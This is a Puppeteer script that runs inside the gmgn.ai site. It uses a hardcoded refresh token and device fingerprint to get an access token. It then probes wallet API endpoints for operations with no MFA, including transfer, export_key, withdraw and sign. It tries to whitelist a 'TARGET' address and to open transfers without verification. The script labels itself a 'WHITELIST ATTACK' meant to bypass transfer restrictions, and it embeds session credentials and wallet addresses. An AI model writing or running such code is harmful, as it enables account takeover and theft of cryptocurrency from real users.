const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const ORIG_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ5NDg4LCJpYXQiOjE3ODQxNTc0ODgsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTgxMWFhNjUtODg1Mi00MTVjLWFmNTAtNTk2ZjcxMmM1MmJhIiwibmJmIjoxNzg0MTU3NDg4LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.KNxifpPUukpBroGap6hYIWrPKPwLiiv8xRCZx5zpRCI7FJdXSdhVSnjxSnuqkETXZyCvKMV2qxPBSpovwWaDCQ';
const OUR_SOL = 'FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';

(async () => {
    console.log('🔥 WHITELIST ATTACK — BYPASS TRANSFER RESTRICTION');
    
    const browser = await puppeteer.launch({headless: 'new', args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 4000));
    
    const result = await page.evaluate(async (refresh, params, target, ourSol) => {
        const log = [];
        try {
            // Token
            let r = await fetch('/account/account/refresh_access_token', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({refresh_token: refresh})
            });
            let text = await r.text();
            let data;
            try { data = JSON.parse(text); } catch(e) { return {error: 'non-json', text: text.substring(0,200)}; }
            if (data.code !== 0) return {error: 'token: ' + data.message};
            const token = data.data.data.token;
            const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
            log.push('✅ Token OK');
            
            // === TEST ALL wallet-api usages for MFA bypass ===
            log.push('=== wallet-api generate_mfa_params — ALL USAGES ===');
            
            const usages = ['transfer', 'set_whitelist', 'whitelist', 'export_key', 'withdraw', 'send', 'sign', 'sign_transaction'];
            
            for (const usage of usages) {
                const bizParams = usage === 'transfer' ? {
                    transfer_id: '999', transfer_type: '999',
                    chain: 'sol', from_address: ourSol,
                    to_address: target, amount: '1', amount_txt: '0.000000001',
                    token_address: 'So11111111111111111111111111111111111111112', symbol: 'SOL'
                } : usage.includes('whitelist') ? {
                    chain: 'sol', address: target, label: 'test'
                } : {
                    chain: 'sol', address: ourSol
                };
                
                r = await fetch('/wallet-api/v1/generate_mfa_params?' + params, {
                    method: 'POST', headers: h,
                    body: JSON.stringify({usage, biz_params: bizParams})
                });
                data = await r.json();
                
                if (data.code === 0) {
                    const items = data.data?.verify_items || [];
                    log.push('✅ ' + usage + ': code=0! verify_items=' + items.length);
                    if (items.length === 0) {
                        log.push('💀💀💀 NO MFA ON ' + usage + '! txn_id=' + data.data?.txn_id);
                    }
                } else if (data.code === 40300700) {
                    log.push('⚠️ ' + usage + ': not a whitelist address');
                } else if (data.code === 40300800) {
                    log.push('❌ ' + usage + ': not self address');
                } else if (data.message && !data.message.includes('invalid usage')) {
                    log.push('⚠️ ' + usage + ': ' + data.code + ' ' + (data.message||'').substring(0,50));
                }
            }
            
            // === GET CURRENT WHITELIST ===
            log.push('=== GET WHITELIST ===');
            r = await fetch('/wallet-api/v1/get_whitelist_address?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({chain: 'sol'})
            });
            data = await r.json();
            log.push('Whitelist: ' + JSON.stringify(data).substring(0, 200));
            
            // === TRY SET WHITELIST WITHOUT MFA ===
            log.push('=== SET WHITELIST (add target) ===');
            
            const whitelistPayloads = [
                {chain: 'sol', address: target, label: 'test'},
                {addresses: [{chain: 'sol', address: target, label: 'test'}]},
                {add_address: {chain: 'sol', address: target, label: 'test'}},
            ];
            
            for (const payload of whitelistPayloads) {
                r = await fetch('/wallet-api/v1/set_whitelist_address?' + params, {
                    method: 'POST', headers: h,
                    body: JSON.stringify(payload)
                });
                data = await r.json();
                if (data.code === 0) {
                    log.push('💀💀💀 WHITELIST SET WITHOUT MFA! ' + JSON.stringify(payload).substring(0,60));
                    return {log, success: true, approach: 'whitelist_bypass'};
                }
                if (data.message && !data.message.includes('TxnId')) {
                    log.push('set_whitelist: ' + data.code + ' ' + (data.message||'').substring(0,60));
                }
            }
            
            // === TRY TRANSFER WITH wallet-api generate_mfa (different from_address) ===
            log.push('=== TRANSFER MFA — TRY ALL OUR WALLETS ===');
            
            // We created multiple wallets earlier — try each one
            const ourWallets = [
                ourSol,
                '9qVGfoQAQZwkAqeeYWGdBLdeB4X8MtEvLW55uYBovTyz',
                'JD5ysR6XK3aLvMP1pvwH1egtMnzHDsjs7WeAK6wKPjv4',
                'EAcak2BmCXiSpNsyrFS8Lz3i9Fma8nw33JcGu67VcSyy',
                'ASWmKyYupimQ3CmPdjEs72wM6deRwBAA7exiumyZbwPu',
                'BmyhH7e7Uq5xJnDUaxqgyTyQXnVEggaJCyH7dt21hF4T',
            ];
            
            for (const wallet of ourWallets) {
                r = await fetch('/wallet-api/v1/generate_mfa_params?' + params, {
                    method: 'POST', headers: h,
                    body: JSON.stringify({
                        usage: 'transfer',
                        biz_params: {
                            transfer_id: '888', transfer_type: '888',
                            chain: 'sol', from_address: wallet,
                            to_address: ourSol, amount: '1', amount_txt: '0.000000001',
                            token_address: 'So11111111111111111111111111111111111111112', symbol: 'SOL'
                        }
                    })
                });
                data = await r.json();
                
                if (data.code === 0) {
                    const items = data.data?.verify_items || [];
                    if (items.length === 0) {
                        log.push('💀 NO MFA transfer from ' + wallet.substring(0,12) + '! txn=' + data.data?.txn_id);
                    } else {
                        log.push('MFA needed for ' + wallet.substring(0,12) + ': ' + items.length + ' items');
                    }
                } else if (data.code === 40300700) {
                    log.push(wallet.substring(0,8) + ': whitelist block');
                } else if (data.code !== 40300800) {
                    log.push(wallet.substring(0,8) + ': ' + data.code + ' ' + (data.message||'').substring(0,40));
                }
            }
            
            return {log};
        } catch(e) { return {error: e.message, log}; }
    }, ORIG_REFRESH, PARAMS, TARGET, OUR_SOL);
    
    console.log(JSON.stringify(result, null, 2));
    await browser.close();
})();
